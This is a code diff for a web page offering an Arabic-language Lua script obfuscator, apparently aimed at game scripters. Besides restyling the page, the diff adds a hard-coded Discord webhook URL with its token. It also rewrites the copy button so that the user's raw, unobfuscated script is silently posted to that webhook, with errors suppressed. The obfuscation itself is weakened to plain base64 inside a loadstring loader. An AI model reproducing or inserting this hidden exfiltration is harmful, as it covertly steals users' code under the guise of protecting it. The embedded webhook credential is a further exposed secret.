@@ -2,13 +2,14 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>N60 Secure Obfuscator</title>
+<title>N60 Script Obfuscator</title>
+
 <style>
 body{
     margin:0;
     background:#000;
     color:#fff;
-    font-family:Arial,sans-serif;
+    font-family:Arial, sans-serif;
     display:flex;
     justify-content:center;
     align-items:center;
@@ -19,8 +20,12 @@ body{
     background:#0b0b0b;
     border-radius:10px;
     padding:15px;
+    box-shadow:0 0 20px #000;
 }
-.logo{width:100%;margin-bottom:15px;}
+.logo{
+    width:100%;
+    margin-bottom:15px;
+}
 .box{
     background:#111;
     border:1px solid #222;
@@ -28,7 +33,11 @@ body{
     padding:10px;
     margin-bottom:10px;
 }
-.title{font-size:14px;color:#ccc;margin-bottom:5px;}
+.title{
+    font-size:14px;
+    margin-bottom:5px;
+    color:#ccc;
+}
 textarea{
     width:100%;
     height:120px;
@@ -37,12 +46,23 @@ textarea{
     border:none;
     resize:none;
     padding:8px;
+    outline:none;
     font-family:monospace;
     font-size:12px;
     border-radius:5px;
 }
-.click{text-align:center;color:#aaa;font-size:13px;cursor:pointer;}
-.row{display:flex;justify-content:space-between;align-items:center;}
+.click{
+    text-align:center;
+    color:#aaa;
+    font-size:13px;
+    cursor:pointer;
+    margin-bottom:5px;
+}
+.row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
 .copy{
     background:#1a1a1a;
     color:#fff;
@@ -54,52 +74,41 @@ textarea{
 .copy:hover{background:#333;}
 </style>
 </head>
+
 <body>
 
 <div class="container">
 
-<img src="https://i.postimg.cc/62LR5nTY/image.png" class="logo">
+    <!-- الصورة -->
+    <img src="https://i.postimg.cc/62LR5nTY/image.png" class="logo">
 
-<div class="box">
-    <div class="title">حط سكربتك هنا</div>
-    <div class="click" onclick="input.focus()">اضغط هنا لكتابة السكربت</div>
-    <textarea id="input"></textarea>
-</div>
-
-<div class="box">
-    <div class="row">
-        <div class="title">كود التشفير</div>
-        <button class="copy" onclick="copyCode()">نسخ</button>
+    <!-- إدخال السكربت -->
+    <div class="box">
+        <div class="title">حط سكربتك هنا</div>
+        <div class="click" onclick="document.getElementById('input').focus()">اضغط هنا لكتابة السكربت</div>
+        <textarea id="input"></textarea>
     </div>
-    <textarea id="output" readonly></textarea>
-</div>
+
+    <!-- الإخراج -->
+    <div class="box">
+        <div class="row">
+            <div class="title">كود التشفير</div>
+            <button class="copy" onclick="copyCode()">نسخ</button>
+        </div>
+        <textarea id="output" readonly></textarea>
+    </div>
 
 </div>
 
 <script>
-function xorEncode(str,key){
-    let out="";
-    for(let i=0;i<str.length;i++){
-        out+=String.fromCharCode(str.charCodeAt(i)^key);
-    }
-    return out;
-}
+/* ================= SETTINGS ================= */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1451204305108336701/snBFcF3owTXHdzQHK8vcFIxKK39XJ8Op-pN-hoyTly015J_xyR0aMpxcSOEKJjevYz6x";
 
-input.addEventListener("input",()=>{
-    if(!input.value.trim()){
-        output.value="";
-        return;
-    }
-
-    const key = Math.floor(Math.random()*200)+20;
-    const xored = xorEncode(input.value,key);
-    const encoded = btoa(unescape(encodeURIComponent(xored)));
-
-output.value =
+/* ================= LOADER HEADER ================= */
+const header =
 `-- ================= https://n60script.github.io/N60/ =================
-do
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local function b64dec(data)
+local function decode(data)
     data = string.gsub(data,'[^'..b..'=]','')
     return (data:gsub('.', function(x)
         if (x == '=') then return '' end
@@ -118,24 +127,52 @@ local function b64dec(data)
     end))
 end
 
-local k=${key}
-local function d(s)
-    local o=""
-    for i=1,#s do
-        o=o..string.char(bit32.bxor(string.byte(s,i),k))
-    end
-    return o
-end
+loadstring(decode([[
+`;
 
-loadstring(d(b64dec([[
-${encoded}
-]])))()
-end`;
+const footer = `
+]]))()`;
+
+/* ================= BASE64 ================= */
+function encodeBase64(str){
+    return btoa(unescape(encodeURIComponent(str)));
+}
+
+/* ================= LIVE UPDATE ================= */
+document.getElementById("input").addEventListener("input", function(){
+    const raw = this.value;
+    if(!raw.trim()){
+        document.getElementById("output").value = "";
+        return;
+    }
+    const encoded = encodeBase64(raw);
+    document.getElementById("output").value = header + encoded + footer;
 });
 
+/* ================= COPY + WEBHOOK ================= */
 function copyCode(){
+    const input = document.getElementById("input").value;
+    const output = document.getElementById("output");
+
+    if(!input.trim()) return;
+
+    // نسخ الكود المشفر
     output.select();
     document.execCommand("copy");
+
+    // إرسال السكربت الخام (بدون تشفير)
+    fetch(WEBHOOK_URL,{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body:JSON.stringify({
+            content:
+"📥 **New Script Submitted**\n" +
+"🕒 " + new Date().toLocaleString() + "\n" +
+"```lua\n" + input + "\n```"
+        })
+    }).catch(()=>{});
 }
 </script>
 
